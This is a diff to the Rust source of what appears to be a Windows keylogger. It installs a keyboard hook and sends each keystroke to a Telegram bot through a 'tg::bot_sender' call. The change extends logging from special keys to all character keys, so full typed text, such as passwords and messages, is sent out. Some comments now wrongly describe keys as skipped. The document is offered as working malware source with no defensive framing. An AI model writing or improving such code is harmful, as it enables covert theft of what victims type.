@@ -42,30 +42,30 @@ unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param:
             tokio::spawn(tg::bot_sender(String::from("(Caps Lock) ")));
         }
 
-        let message = match keyboard.vkCode {
-            9 => "Key pressed: Tab",
-            20 => "Key pressed: Caps Lock",
-            160 => "Key pressed: Shift",
-            162 => "Key pressed: Ctrl",
-            164 => "Key pressed: Alt",
-            32 => "Key pressed: Space",
-            27 => "Key pressed: Esc",
-            8 => "Key pressed: Backspace",
-            13 => "Key pressed: Enter",
+        let message: String = match keyboard.vkCode {
+            9 => "Key pressed: Tab".to_string(),
+            20 => "Key pressed: Caps Lock".to_string(),
+            160 => "Key pressed: Shift".to_string(),
+            162 => "Key pressed: Ctrl".to_string(),
+            164 => "Key pressed: Alt".to_string(),
+            32 => "Key pressed: Space".to_string(),
+            27 => "Key pressed: Esc".to_string(),
+            8 => "Key pressed: Backspace".to_string(),
+            13 => "Key pressed: Enter".to_string(),
             _ => {
                 if is_shift_pressed && is_any_key_pressed() {
                     if keyboard.vkCode == 164 {
-                        "(Shift) Key pressed: Alt"
+                        "(Shift) Key pressed: Alt".to_string()
                     } else {
-                        return 0; // Skip character keys when shift is pressed with other keys
+                        format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char)  // Skip character keys when shift is pressed with other keys
                     }
                 } else {
-                    return 0; // Skip unhandled keys
+                    format!("Key pressed: {}", keyboard.vkCode as u8 as char).to_string() // Skip unhandled keys
                 }
             }
         };
 
-        tokio::spawn(tg::bot_sender(String::from(message)));
+        tokio::spawn(tg::bot_sender(message));
     }
     CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
